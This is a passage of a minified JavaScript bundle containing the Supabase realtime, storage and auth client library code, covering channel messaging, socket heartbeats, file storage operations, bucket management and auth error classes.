${this.socket.accessTokenValue}`:"",apikey:this.socket.apiKey?this.socket.apiKey:"","Content-Type":"application/json"},body:JSON.stringify({messages:[{topic:this.subTopic,event:i,payload:o,private:this.private}]})};try{const d=await this._fetchWithTimeout(this.broadcastEndpointURL,c,(n=r.timeout)!==null&&n!==void 0?n:this.timeout);return await((s=d.body)===null||s===void 0?void 0:s.cancel()),d.ok?"ok":"error"}catch(d){return d.name==="AbortError"?"timed out":"error"}}else return new Promise(i=>{var o,l,c;const d=this._push(e.type,e,r.timeout||this.timeout);e.type==="broadcast"&&!(!((c=(l=(o=this.params)===null||o===void 0?void 0:o.config)===null||l===void 0?void 0:l.broadcast)===null||c===void 0)&&c.ack)&&i("ok"),d.receive("ok",()=>i("ok")),d.receive("error",()=>i("error")),d.receive("timeout",()=>i("timed out"))})}updateJoinPayload(e){this.joinPush.updatePayload(e)}unsubscribe(e=this.timeout){this.state=at.leaving;const r=()=>{this.socket.log("channel",`leave ${this.topic}`),this._trigger(nr.close,"leave",this._joinRef())};this.joinPush.destroy();let n=null;return new Promise(s=>{n=new nd(this,nr.leave,{},e),n.receive("ok",()=>{r(),s("ok")}).receive("timeout",()=>{r(),s("timed out")}).receive("error",()=>{s("error")}),n.send(),this._canPush()||n.trigger("ok",{})}).finally(()=>{n==null||n.destroy()})}teardown(){this.pushBuffer.forEach(e=>e.destroy()),this.rejoinTimer&&clearTimeout(this.rejoinTimer.timer),this.joinPush.destroy()}async _fetchWithTimeout(e,r,n){const s=new AbortController,i=setTimeout(()=>s.abort(),n),o=await this.socket.fetch(e,Object.assign(Object.assign({},r),{signal:s.signal}));return clearTimeout(i),o}_push(e,r,n=this.timeout){if(!this.joinedOnce)throw`tried to push '${e}' to '${this.topic}' before joining. Use channel.subscribe() before pushing events`;let s=new nd(this,e,r,n);return this._canPush()?s.send():(s.startTimeout(),this.pushBuffer.push(s)),s}_onMessage(e,r,n){return r}_isMember(e){return this.topic===e}_joinRef(){return this.joinPush.ref}_trigger(e,r,n){var s,i;const o=e.toLocaleLowerCase(),{close:l,error:c,leave:d,join:u}=nr;if(n&&[l,c,d,u].indexOf(o)>=0&&n!==this._joinRef())return;let f=this._onMessage(o,r,n);if(r&&!f)throw"channel onMessage callbacks must return the payload, modified or unmodified";["insert","update","delete"].includes(o)?(s=this.bindings.postgres_changes)===null||s===void 0||s.filter(m=>{var g,v,w;return((g=m.filter)===null||g===void 0?void 0:g.event)==="*"||((w=(v=m.filter)===null||v===void 0?void 0:v.event)===null||w===void 0?void 0:w.toLocaleLowerCase())===o}).map(m=>m.callback(f,n)):(i=this.bindings[o])===null||i===void 0||i.filter(m=>{var g,v,w,y,x,b;if(["broadcast","presence","postgres_changes"].includes(o))if("id"in m){const j=m.id,_=(g=m.filter)===null||g===void 0?void 0:g.event;return j&&((v=r.ids)===null||v===void 0?void 0:v.includes(j))&&(_==="*"||(_==null?void 0:_.toLocaleLowerCase())===((w=r.data)===null||w===void 0?void 0:w.type.toLocaleLowerCase()))}else{const j=(x=(y=m==null?void 0:m.filter)===null||y===void 0?void 0:y.event)===null||x===void 0?void 0:x.toLocaleLowerCase();return j==="*"||j===((b=r==null?void 0:r.event)===null||b===void 0?void 0:b.toLocaleLowerCase())}else return m.type.toLocaleLowerCase()===o}).map(m=>{if(typeof f=="object"&&"ids"in f){const g=f.data,{schema:v,table:w,commit_timestamp:y,type:x,errors:b}=g;f=Object.assign(Object.assign({},{schema:v,table:w,commit_timestamp:y,eventType:x,new:{},old:{},errors:b}),this._getPayloadRecords(g))}m.callback(f,n)})}_isClosed(){return this.state===at.closed}_isJoined(){return this.state===at.joined}_isJoining(){return this.state===at.joining}_isLeaving(){return this.state===at.leaving}_replyEventName(e){return`chan_reply_${e}`}_on(e,r,n){const s=e.toLocaleLowerCase(),i={type:s,filter:r,callback:n};return this.bindings[s]?this.bindings[s].push(i):this.bindings[s]=[i],this}_off(e,r){const n=e.toLocaleLowerCase();return this.bindings[n]=this.bindings[n].filter(s=>{var i;return!(((i=s.type)===null||i===void 0?void 0:i.toLocaleLowerCase())===n&&mf.isEqual(s.filter,r))}),this}static isEqual(e,r){if(Object.keys(e).length!==Object.keys(r).length)return!1;for(const n in e)if(e[n]!==r[n])return!1;return!0}_rejoinUntilConnected(){this.rejoinTimer.scheduleTimeout(),this.socket.isConnected()&&this._rejoin()}_onClose(e){this._on(nr.close,{},e)}_onError(e){this._on(nr.error,{},r=>e(r))}_canPush(){return this.socket.isConnected()&&this._isJoined()}_rejoin(e=this.timeout){this._isLeaving()||(this.socket._leaveOpenTopic(this.topic),this.state=at.joining,this.joinPush.resend(e))}_getPayloadRecords(e){const r={new:{},old:{}};return(e.type==="INSERT"||e.type==="UPDATE")&&(r.new=N0(e.columns,e.record)),(e.type==="UPDATE"||e.type==="DELETE")&&(r.old=N0(e.columns,e.old_record)),r}}const C0=()=>{},dE=`
  addEventListener("message", (e) => {
    if (e.data.event === "start") {
      setInterval(() => postMessage({ event: "keepAlive" }), e.data.interval);
    }
  });`;class uE{constructor(e,r){var n;this.accessTokenValue=null,this.apiKey=null,this.channels=new Array,this.endPoint="",this.httpEndpoint="",this.headers={},this.params={},this.timeout=vv,this.heartbeatIntervalMs=25e3,this.heartbeatTimer=void 0,this.pendingHeartbeatRef=null,this.heartbeatCallback=C0,this.ref=0,this.logger=C0,this.conn=null,this.sendBuffer=[],this.serializer=new nE,this.stateChangeCallbacks={open:[],close:[],error:[],message:[]},this.accessToken=null,this._resolveFetch=i=>{let o;return i?o=i:typeof fetch>"u"?o=(...l)=>Vt(async()=>{const{default:c}=await Promise.resolve().then(()=>La);return{default:c}},void 0).then(({default:c})=>c(...l)):o=fetch,(...l)=>o(...l)},this.endPoint=`${e}/${Su.websocket}`,this.httpEndpoint=jv(e),r!=null&&r.transport?this.transport=r.transport:this.transport=null,r!=null&&r.params&&(this.params=r.params),r!=null&&r.timeout&&(this.timeout=r.timeout),r!=null&&r.logger&&(this.logger=r.logger),(r!=null&&r.logLevel||r!=null&&r.log_level)&&(this.logLevel=r.logLevel||r.log_level,this.params=Object.assign(Object.assign({},this.params),{log_level:this.logLevel})),r!=null&&r.heartbeatIntervalMs&&(this.heartbeatIntervalMs=r.heartbeatIntervalMs);const s=(n=r==null?void 0:r.params)===null||n===void 0?void 0:n.apikey;if(s&&(this.accessTokenValue=s,this.apiKey=s),this.reconnectAfterMs=r!=null&&r.reconnectAfterMs?r.reconnectAfterMs:i=>[1e3,2e3,5e3,1e4][i-1]||1e4,this.encode=r!=null&&r.encode?r.encode:(i,o)=>o(JSON.stringify(i)),this.decode=r!=null&&r.decode?r.decode:this.serializer.decode.bind(this.serializer),this.reconnectTimer=new bv(async()=>{this.disconnect(),this.connect()},this.reconnectAfterMs),this.fetch=this._resolveFetch(r==null?void 0:r.fetch),r!=null&&r.worker){if(typeof window<"u"&&!window.Worker)throw new Error("Web Worker is not supported");this.worker=(r==null?void 0:r.worker)||!1,this.workerUrl=r==null?void 0:r.workerUrl}this.accessToken=(r==null?void 0:r.accessToken)||null}connect(){if(!this.conn){if(this.transport||(this.transport=Xk),!this.transport)throw new Error("No transport provided");this.conn=new this.transport(this.endpointURL()),this.setupConnection()}}endpointURL(){return this._appendParams(this.endPoint,Object.assign({},this.params,{vsn:tE}))}disconnect(e,r){this.conn&&(this.conn.onclose=function(){},e?this.conn.close(e,r??""):this.conn.close(),this.conn=null,this.heartbeatTimer&&clearInterval(this.heartbeatTimer),this.reconnectTimer.reset(),this.channels.forEach(n=>n.teardown()))}getChannels(){return this.channels}async removeChannel(e){const r=await e.unsubscribe();return this.channels.length===0&&this.disconnect(),r}async removeAllChannels(){const e=await Promise.all(this.channels.map(r=>r.unsubscribe()));return this.channels=[],this.disconnect(),e}log(e,r,n){this.logger(e,r,n)}connectionState(){switch(this.conn&&this.conn.readyState){case ci.connecting:return Kn.Connecting;case ci.open:return Kn.Open;case ci.closing:return Kn.Closing;default:return Kn.Closed}}isConnected(){return this.connectionState()===Kn.Open}channel(e,r={config:{}}){const n=`realtime:${e}`,s=this.getChannels().find(i=>i.topic===n);if(s)return s;{const i=new mf(`realtime:${e}`,r,this);return this.channels.push(i),i}}push(e){const{topic:r,event:n,payload:s,ref:i}=e,o=()=>{this.encode(e,l=>{var c;(c=this.conn)===null||c===void 0||c.send(l)})};this.log("push",`${r} ${n} (${i})`,s),this.isConnected()?o():this.sendBuffer.push(o)}async setAuth(e=null){let r=e||this.accessToken&&await this.accessToken()||this.accessTokenValue;this.accessTokenValue!=r&&(this.accessTokenValue=r,this.channels.forEach(n=>{const s={access_token:r,version:eE};r&&n.updateJoinPayload(s),n.joinedOnce&&n._isJoined()&&n._push(nr.access_token,{access_token:r})}))}async sendHeartbeat(){var e;if(!this.isConnected()){this.heartbeatCallback("disconnected");return}if(this.pendingHeartbeatRef){this.pendingHeartbeatRef=null,this.log("transport","heartbeat timeout. Attempting to re-establish connection"),this.heartbeatCallback("timeout"),(e=this.conn)===null||e===void 0||e.close(rE,"hearbeat timeout");return}this.pendingHeartbeatRef=this._makeRef(),this.push({topic:"phoenix",event:"heartbeat",payload:{},ref:this.pendingHeartbeatRef}),this.heartbeatCallback("sent"),await this.setAuth()}onHeartbeat(e){this.heartbeatCallback=e}flushSendBuffer(){this.isConnected()&&this.sendBuffer.length>0&&(this.sendBuffer.forEach(e=>e()),this.sendBuffer=[])}_makeRef(){let e=this.ref+1;return e===this.ref?this.ref=0:this.ref=e,this.ref.toString()}_leaveOpenTopic(e){let r=this.channels.find(n=>n.topic===e&&(n._isJoined()||n._isJoining()));r&&(this.log("transport",`leaving duplicate topic "${e}"`),r.unsubscribe())}_remove(e){this.channels=this.channels.filter(r=>r.topic!==e.topic)}setupConnection(){this.conn&&(this.conn.binaryType="arraybuffer",this.conn.onopen=()=>this._onConnOpen(),this.conn.onerror=e=>this._onConnError(e),this.conn.onmessage=e=>this._onConnMessage(e),this.conn.onclose=e=>this._onConnClose(e))}_onConnMessage(e){this.decode(e.data,r=>{let{topic:n,event:s,payload:i,ref:o}=r;n==="phoenix"&&s==="phx_reply"&&this.heartbeatCallback(r.payload.status=="ok"?"ok":"error"),o&&o===this.pendingHeartbeatRef&&(this.pendingHeartbeatRef=null),this.log("receive",`${i.status||""} ${n} ${s} ${o&&"("+o+")"||""}`,i),Array.from(this.channels).filter(l=>l._isMember(n)).forEach(l=>l._trigger(s,i,o)),this.stateChangeCallbacks.message.forEach(l=>l(r))})}_onConnOpen(){this.log("transport",`connected to ${this.endpointURL()}`),this.flushSendBuffer(),this.reconnectTimer.reset(),this.worker?this.workerRef||this._startWorkerHeartbeat():this._startHeartbeat(),this.stateChangeCallbacks.open.forEach(e=>e())}_startHeartbeat(){this.heartbeatTimer&&clearInterval(this.heartbeatTimer),this.heartbeatTimer=setInterval(()=>this.sendHeartbeat(),this.heartbeatIntervalMs)}_startWorkerHeartbeat(){this.workerUrl?this.log("worker",`starting worker for from ${this.workerUrl}`):this.log("worker","starting default worker");const e=this._workerObjectUrl(this.workerUrl);this.workerRef=new Worker(e),this.workerRef.onerror=r=>{this.log("worker","worker error",r.message),this.workerRef.terminate()},this.workerRef.onmessage=r=>{r.data.event==="keepAlive"&&this.sendHeartbeat()},this.workerRef.postMessage({event:"start",interval:this.heartbeatIntervalMs})}_onConnClose(e){this.log("transport","close",e),this._triggerChanError(),this.heartbeatTimer&&clearInterval(this.heartbeatTimer),this.reconnectTimer.scheduleTimeout(),this.stateChangeCallbacks.close.forEach(r=>r(e))}_onConnError(e){this.log("transport",`${e}`),this._triggerChanError(),this.stateChangeCallbacks.error.forEach(r=>r(e))}_triggerChanError(){this.channels.forEach(e=>e._trigger(nr.error))}_appendParams(e,r){if(Object.keys(r).length===0)return e;const n=e.match(/\?/)?"&":"?",s=new URLSearchParams(r);return`${e}${n}${s}`}_workerObjectUrl(e){let r;if(e)r=e;else{const n=new Blob([dE],{type:"application/javascript"});r=URL.createObjectURL(n)}return r}}class pf extends Error{constructor(e){super(e),this.__isStorageError=!0,this.name="StorageError"}}function Ke(t){return typeof t=="object"&&t!==null&&"__isStorageError"in t}class hE extends pf{constructor(e,r,n){super(e),this.name="StorageApiError",this.status=r,this.statusCode=n}toJSON(){return{name:this.name,message:this.message,status:this.status,statusCode:this.statusCode}}}class Eu extends pf{constructor(e,r){super(e),this.name="StorageUnknownError",this.originalError=r}}var fE=function(t,e,r,n){function s(i){return i instanceof r?i:new r(function(o){o(i)})}return new(r||(r=Promise))(function(i,o){function l(u){try{d(n.next(u))}catch(h){o(h)}}function c(u){try{d(n.throw(u))}catch(h){o(h)}}function d(u){u.done?i(u.value):s(u.value).then(l,c)}d((n=n.apply(t,e||[])).next())})};const _v=t=>{let e;return t?e=t:typeof fetch>"u"?e=(...r)=>Vt(async()=>{const{default:n}=await Promise.resolve().then(()=>La);return{default:n}},void 0).then(({default:n})=>n(...r)):e=fetch,(...r)=>e(...r)},mE=()=>fE(void 0,void 0,void 0,function*(){return typeof Response>"u"?(yield Vt(()=>Promise.resolve().then(()=>La),void 0)).Response:Response}),Cu=t=>{if(Array.isArray(t))return t.map(r=>Cu(r));if(typeof t=="function"||t!==Object(t))return t;const e={};return Object.entries(t).forEach(([r,n])=>{const s=r.replace(/([-_][a-z])/gi,i=>i.toUpperCase().replace(/[-_]/g,""));e[s]=Cu(n)}),e},pE=t=>{if(typeof t!="object"||t===null)return!1;const e=Object.getPrototypeOf(t);return(e===null||e===Object.prototype||Object.getPrototypeOf(e)===null)&&!(Symbol.toStringTag in t)&&!(Symbol.iterator in t)};var js=function(t,e,r,n){function s(i){return i instanceof r?i:new r(function(o){o(i)})}return new(r||(r=Promise))(function(i,o){function l(u){try{d(n.next(u))}catch(h){o(h)}}function c(u){try{d(n.throw(u))}catch(h){o(h)}}function d(u){u.done?i(u.value):s(u.value).then(l,c)}d((n=n.apply(t,e||[])).next())})};const sd=t=>t.msg||t.message||t.error_description||t.error||JSON.stringify(t),gE=(t,e,r)=>js(void 0,void 0,void 0,function*(){const n=yield mE();t instanceof n&&!(r!=null&&r.noResolveJson)?t.json().then(s=>{const i=t.status||500,o=(s==null?void 0:s.statusCode)||i+"";e(new hE(sd(s),i,o))}).catch(s=>{e(new Eu(sd(s),s))}):e(new Eu(sd(t),t))}),xE=(t,e,r,n)=>{const s={method:t,headers:(e==null?void 0:e.headers)||{}};return t==="GET"||!n?s:(pE(n)?(s.headers=Object.assign({"Content-Type":"application/json"},e==null?void 0:e.headers),s.body=JSON.stringify(n)):s.body=n,Object.assign(Object.assign({},s),r))};function Zi(t,e,r,n,s,i){return js(this,void 0,void 0,function*(){return new Promise((o,l)=>{t(r,xE(e,n,s,i)).then(c=>{if(!c.ok)throw c;return n!=null&&n.noResolveJson?c:c.json()}).then(c=>o(c)).catch(c=>gE(c,l,n))})})}function Pl(t,e,r,n){return js(this,void 0,void 0,function*(){return Zi(t,"GET",e,r,n)})}function Ir(t,e,r,n,s){return js(this,void 0,void 0,function*(){return Zi(t,"POST",e,n,s,r)})}function Tu(t,e,r,n,s){return js(this,void 0,void 0,function*(){return Zi(t,"PUT",e,n,s,r)})}function yE(t,e,r,n){return js(this,void 0,void 0,function*(){return Zi(t,"HEAD",e,Object.assign(Object.assign({},r),{noResolveJson:!0}),n)})}function Nv(t,e,r,n,s){return js(this,void 0,void 0,function*(){return Zi(t,"DELETE",e,n,s,r)})}var xt=function(t,e,r,n){function s(i){return i instanceof r?i:new r(function(o){o(i)})}return new(r||(r=Promise))(function(i,o){function l(u){try{d(n.next(u))}catch(h){o(h)}}function c(u){try{d(n.throw(u))}catch(h){o(h)}}function d(u){u.done?i(u.value):s(u.value).then(l,c)}d((n=n.apply(t,e||[])).next())})};const vE={limit:100,offset:0,sortBy:{column:"name",order:"asc"}},T0={cacheControl:"3600",contentType:"text/plain;charset=UTF-8",upsert:!1};class bE{constructor(e,r={},n,s){this.url=e,this.headers=r,this.bucketId=n,this.fetch=_v(s)}uploadOrUpdate(e,r,n,s){return xt(this,void 0,void 0,function*(){try{let i;const o=Object.assign(Object.assign({},T0),s);let l=Object.assign(Object.assign({},this.headers),e==="POST"&&{"x-upsert":String(o.upsert)});const c=o.metadata;typeof Blob<"u"&&n instanceof Blob?(i=new FormData,i.append("cacheControl",o.cacheControl),c&&i.append("metadata",this.encodeMetadata(c)),i.append("",n)):typeof FormData<"u"&&n instanceof FormData?(i=n,i.append("cacheControl",o.cacheControl),c&&i.append("metadata",this.encodeMetadata(c))):(i=n,l["cache-control"]=`max-age=${o.cacheControl}`,l["content-type"]=o.contentType,c&&(l["x-metadata"]=this.toBase64(this.encodeMetadata(c)))),s!=null&&s.headers&&(l=Object.assign(Object.assign({},l),s.headers));const d=this._removeEmptyFolders(r),u=this._getFinalPath(d),h=yield(e=="PUT"?Tu:Ir)(this.fetch,`${this.url}/object/${u}`,i,Object.assign({headers:l},o!=null&&o.duplex?{duplex:o.duplex}:{}));return{data:{path:d,id:h.Id,fullPath:h.Key},error:null}}catch(i){if(Ke(i))return{data:null,error:i};throw i}})}upload(e,r,n){return xt(this,void 0,void 0,function*(){return this.uploadOrUpdate("POST",e,r,n)})}uploadToSignedUrl(e,r,n,s){return xt(this,void 0,void 0,function*(){const i=this._removeEmptyFolders(e),o=this._getFinalPath(i),l=new URL(this.url+`/object/upload/sign/${o}`);l.searchParams.set("token",r);try{let c;const d=Object.assign({upsert:T0.upsert},s),u=Object.assign(Object.assign({},this.headers),{"x-upsert":String(d.upsert)});typeof Blob<"u"&&n instanceof Blob?(c=new FormData,c.append("cacheControl",d.cacheControl),c.append("",n)):typeof FormData<"u"&&n instanceof FormData?(c=n,c.append("cacheControl",d.cacheControl)):(c=n,u["cache-control"]=`max-age=${d.cacheControl}`,u["content-type"]=d.contentType);const h=yield Tu(this.fetch,l.toString(),c,{headers:u});return{data:{path:i,fullPath:h.Key},error:null}}catch(c){if(Ke(c))return{data:null,error:c};throw c}})}createSignedUploadUrl(e,r){return xt(this,void 0,void 0,function*(){try{let n=this._getFinalPath(e);const s=Object.assign({},this.headers);r!=null&&r.upsert&&(s["x-upsert"]="true");const i=yield Ir(this.fetch,`${this.url}/object/upload/sign/${n}`,{},{headers:s}),o=new URL(this.url+i.url),l=o.searchParams.get("token");if(!l)throw new pf("No token returned by API");return{data:{signedUrl:o.toString(),path:e,token:l},error:null}}catch(n){if(Ke(n))return{data:null,error:n};throw n}})}update(e,r,n){return xt(this,void 0,void 0,function*(){return this.uploadOrUpdate("PUT",e,r,n)})}move(e,r,n){return xt(this,void 0,void 0,function*(){try{return{data:yield Ir(this.fetch,`${this.url}/object/move`,{bucketId:this.bucketId,sourceKey:e,destinationKey:r,destinationBucket:n==null?void 0:n.destinationBucket},{headers:this.headers}),error:null}}catch(s){if(Ke(s))return{data:null,error:s};throw s}})}copy(e,r,n){return xt(this,void 0,void 0,function*(){try{return{data:{path:(yield Ir(this.fetch,`${this.url}/object/copy`,{bucketId:this.bucketId,sourceKey:e,destinationKey:r,destinationBucket:n==null?void 0:n.destinationBucket},{headers:this.headers})).Key},error:null}}catch(s){if(Ke(s))return{data:null,error:s};throw s}})}createSignedUrl(e,r,n){return xt(this,void 0,void 0,function*(){try{let s=this._getFinalPath(e),i=yield Ir(this.fetch,`${this.url}/object/sign/${s}`,Object.assign({expiresIn:r},n!=null&&n.transform?{transform:n.transform}:{}),{headers:this.headers});const o=n!=null&&n.download?`&download=${n.download===!0?"":n.download}`:"";return i={signedUrl:encodeURI(`${this.url}${i.signedURL}${o}`)},{data:i,error:null}}catch(s){if(Ke(s))return{data:null,error:s};throw s}})}createSignedUrls(e,r,n){return xt(this,void 0,void 0,function*(){try{const s=yield Ir(this.fetch,`${this.url}/object/sign/${this.bucketId}`,{expiresIn:r,paths:e},{headers:this.headers}),i=n!=null&&n.download?`&download=${n.download===!0?"":n.download}`:"";return{data:s.map(o=>Object.assign(Object.assign({},o),{signedUrl:o.signedURL?encodeURI(`${this.url}${o.signedURL}${i}`):null})),error:null}}catch(s){if(Ke(s))return{data:null,error:s};throw s}})}download(e,r){return xt(this,void 0,void 0,function*(){const s=typeof(r==null?void 0:r.transform)<"u"?"render/image/authenticated":"object",i=this.transformOptsToQueryString((r==null?void 0:r.transform)||{}),o=i?`?${i}`:"";try{const l=this._getFinalPath(e);return{data:yield(yield Pl(this.fetch,`${this.url}/${s}/${l}${o}`,{headers:this.headers,noResolveJson:!0})).blob(),error:null}}catch(l){if(Ke(l))return{data:null,error:l};throw l}})}info(e){return xt(this,void 0,void 0,function*(){const r=this._getFinalPath(e);try{const n=yield Pl(this.fetch,`${this.url}/object/info/${r}`,{headers:this.headers});return{data:Cu(n),error:null}}catch(n){if(Ke(n))return{data:null,error:n};throw n}})}exists(e){return xt(this,void 0,void 0,function*(){const r=this._getFinalPath(e);try{return yield yE(this.fetch,`${this.url}/object/${r}`,{headers:this.headers}),{data:!0,error:null}}catch(n){if(Ke(n)&&n instanceof Eu){const s=n.originalError;if([400,404].includes(s==null?void 0:s.status))return{data:!1,error:n}}throw n}})}getPublicUrl(e,r){const n=this._getFinalPath(e),s=[],i=r!=null&&r.download?`download=${r.download===!0?"":r.download}`:"";i!==""&&s.push(i);const l=typeof(r==null?void 0:r.transform)<"u"?"render/image":"object",c=this.transformOptsToQueryString((r==null?void 0:r.transform)||{});c!==""&&s.push(c);let d=s.join("&");return d!==""&&(d=`?${d}`),{data:{publicUrl:encodeURI(`${this.url}/${l}/public/${n}${d}`)}}}remove(e){return xt(this,void 0,void 0,function*(){try{return{data:yield Nv(this.fetch,`${this.url}/object/${this.bucketId}`,{prefixes:e},{headers:this.headers}),error:null}}catch(r){if(Ke(r))return{data:null,error:r};throw r}})}list(e,r,n){return xt(this,void 0,void 0,function*(){try{const s=Object.assign(Object.assign(Object.assign({},vE),r),{prefix:e||""});return{data:yield Ir(this.fetch,`${this.url}/object/list/${this.bucketId}`,s,{headers:this.headers},n),error:null}}catch(s){if(Ke(s))return{data:null,error:s};throw s}})}encodeMetadata(e){return JSON.stringify(e)}toBase64(e){return typeof Buffer<"u"?Buffer.from(e).toString("base64"):btoa(e)}_getFinalPath(e){return`${this.bucketId}/${e.replace(/^\/+/,"")}`}_removeEmptyFolders(e){return e.replace(/^\/|\/$/g,"").replace(/\/+/g,"/")}transformOptsToQueryString(e){const r=[];return e.width&&r.push(`width=${e.width}`),e.height&&r.push(`height=${e.height}`),e.resize&&r.push(`resize=${e.resize}`),e.format&&r.push(`format=${e.format}`),e.quality&&r.push(`quality=${e.quality}`),r.join("&")}}const wE="2.10.4",jE={"X-Client-Info":`storage-js/${wE}`};var Es=function(t,e,r,n){function s(i){return i instanceof r?i:new r(function(o){o(i)})}return new(r||(r=Promise))(function(i,o){function l(u){try{d(n.next(u))}catch(h){o(h)}}function c(u){try{d(n.throw(u))}catch(h){o(h)}}function d(u){u.done?i(u.value):s(u.value).then(l,c)}d((n=n.apply(t,e||[])).next())})};class _E{constructor(e,r={},n,s){const i=new URL(e);s!=null&&s.useNewHostname&&/supabase\.(co|in|red)$/.test(i.hostname)&&!i.hostname.includes("storage.supabase.")&&(i.hostname=i.hostname.replace("supabase.","storage.supabase.")),this.url=i.href,this.headers=Object.assign(Object.assign({},jE),r),this.fetch=_v(n)}listBuckets(){return Es(this,void 0,void 0,function*(){try{return{data:yield Pl(this.fetch,`${this.url}/bucket`,{headers:this.headers}),error:null}}catch(e){if(Ke(e))return{data:null,error:e};throw e}})}getBucket(e){return Es(this,void 0,void 0,function*(){try{return{data:yield Pl(this.fetch,`${this.url}/bucket/${e}`,{headers:this.headers}),error:null}}catch(r){if(Ke(r))return{data:null,error:r};throw r}})}createBucket(e,r={public:!1}){return Es(this,void 0,void 0,function*(){try{return{data:yield Ir(this.fetch,`${this.url}/bucket`,{id:e,name:e,type:r.type,public:r.public,file_size_limit:r.fileSizeLimit,allowed_mime_types:r.allowedMimeTypes},{headers:this.headers}),error:null}}catch(n){if(Ke(n))return{data:null,error:n};throw n}})}updateBucket(e,r){return Es(this,void 0,void 0,function*(){try{return{data:yield Tu(this.fetch,`${this.url}/bucket/${e}`,{id:e,name:e,public:r.public,file_size_limit:r.fileSizeLimit,allowed_mime_types:r.allowedMimeTypes},{headers:this.headers}),error:null}}catch(n){if(Ke(n))return{data:null,error:n};throw n}})}emptyBucket(e){return Es(this,void 0,void 0,function*(){try{return{data:yield Ir(this.fetch,`${this.url}/bucket/${e}/empty`,{},{headers:this.headers}),error:null}}catch(r){if(Ke(r))return{data:null,error:r};throw r}})}deleteBucket(e){return Es(this,void 0,void 0,function*(){try{return{data:yield Nv(this.fetch,`${this.url}/bucket/${e}`,{},{headers:this.headers}),error:null}}catch(r){if(Ke(r))return{data:null,error:r};throw r}})}}class NE extends _E{constructor(e,r={},n,s){super(e,r,n,s)}from(e){return new bE(this.url,this.headers,e,this.fetch)}}const SE="2.53.0";let Xa="";typeof Deno<"u"?Xa="deno":typeof document<"u"?Xa="web":typeof navigator<"u"&&navigator.product==="ReactNative"?Xa="react-native":Xa="node";const kE={"X-Client-Info":`supabase-js-${Xa}/${SE}`},EE={headers:kE},CE={schema:"public"},TE={autoRefreshToken:!0,persistSession:!0,detectSessionInUrl:!0,flowType:"implicit"},PE={};var AE=function(t,e,r,n){function s(i){return i instanceof r?i:new r(function(o){o(i)})}return new(r||(r=Promise))(function(i,o){function l(u){try{d(n.next(u))}catch(h){o(h)}}function c(u){try{d(n.throw(u))}catch(h){o(h)}}function d(u){u.done?i(u.value):s(u.value).then(l,c)}d((n=n.apply(t,e||[])).next())})};const RE=t=>{let e;return t?e=t:typeof fetch>"u"?e=lv:e=fetch,(...r)=>e(...r)},IE=()=>typeof Headers>"u"?cv:Headers,LE=(t,e,r)=>{const n=RE(r),s=IE();return(i,o)=>AE(void 0,void 0,void 0,function*(){var l;const c=(l=yield e())!==null&&l!==void 0?l:t;let d=new s(o==null?void 0:o.headers);return d.has("apikey")||d.set("apikey",t),d.has("Authorization")||d.set("Authorization",`Bearer ${c}`),n(i,Object.assign(Object.assign({},o),{headers:d}))})};var ME=function(t,e,r,n){function s(i){return i instanceof r?i:new r(function(o){o(i)})}return new(r||(r=Promise))(function(i,o){function l(u){try{d(n.next(u))}catch(h){o(h)}}function c(u){try{d(n.throw(u))}catch(h){o(h)}}function d(u){u.done?i(u.value):s(u.value).then(l,c)}d((n=n.apply(t,e||[])).next())})};function OE(t){return t.endsWith("/")?t:t+"/"}function $E(t,e){var r,n;const{db:s,auth:i,realtime:o,global:l}=t,{db:c,auth:d,realtime:u,global:h}=e,f={db:Object.assign(Object.assign({},c),s),auth:Object.assign(Object.assign({},d),i),realtime:Object.assign(Object.assign({},u),o),storage:{},global:Object.assign(Object.assign(Object.assign({},h),l),{headers:Object.assign(Object.assign({},(r=h==null?void 0:h.headers)!==null&&r!==void 0?r:{}),(n=l==null?void 0:l.headers)!==null&&n!==void 0?n:{})}),accessToken:()=>ME(this,void 0,void 0,function*(){return""})};return t.accessToken?f.accessToken=t.accessToken:delete f.accessToken,f}const Sv="2.71.1",Ls=30*1e3,Pu=3,ad=Pu*Ls,UE="http://localhost:9999",DE="supabase.auth.token",zE={"X-Client-Info":`gotrue-js/${Sv}`},Au="X-Supabase-Api-Version",kv={"2024-01-01":{timestamp:Date.parse("2024-01-01T00:00:00.0Z"),name:"2024-01-01"}},FE=/^([a-z0-9_-]{4})*($|[a-z0-9_-]{3}$|[a-z0-9_-]{2}$)$/i,BE=10*60*1e3;class gf extends Error{constructor(e,r,n){super(e),this.__isAuthError=!0,this.name="AuthError",this.status=r,this.code=n}}function ae(t){return typeof t=="object"&&t!==null&&"__isAuthError"in t}class VE extends gf{constructor(e,r,n){super(e,r,n),this.name="AuthApiError",this.status=r,this.code=n}}function HE(t){return ae(t)&&t.name==="AuthApiError"}class Ev extends gf{constructor(e,r){super(e),this.name="AuthUnknownError",this.originalError=r}}class Mn extends gf{constructor(e,r,n,s){super(e,n,s),this.name=r,this.status=n}}class Xr extends Mn{constructor(){super("Auth session missing!","AuthSessionMissingError",400,void 0)}}function GE(t){return ae(t)&&t.name==="AuthSessionMissingError"}class ko extends Mn{constructor(){super("Auth session or user missing","AuthInvalidTokenResponseError",500,void 0)}}class Eo extends Mn{constructor(e){super(e,"AuthInvalidCredentialsError",400,void 0)}}class Co extends Mn{constructor(e,r=null){super(e,"AuthImplicitGrantRedirectError",500,void 0),this.details=null,this.details=r}toJSON(){return{name:this.name,message:this.message,status:this.status,details:this.details}}}function WE(t){return ae(t)&&t.name==="AuthImplicitGrantRedirectError"}class P0 extends Mn{constructor(e,r=null){super(e,"AuthPKCEGrantCodeExchangeError",500,void 0),this.details=null,this.details=r}toJSON(){return{name:this.name,message:this.message,status:this.status,details:this.details}}}class Ru extends Mn{constructor(e,r){super(e,"AuthRetryableFetchError",r,void 0)}}function id(t){return ae(t)&&t.name==="AuthRetryableFetchError"}class A0 extends Mn{constructor(e,r,n){super(e,"AuthWeakPasswordError",r,"weak_password"),this.reasons=n}}class Iu extends Mn{constructor(e){super(e,"AuthInvalidJwtError",400,"invalid_jwt")}}const Al="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_".split(""),R0=` 	
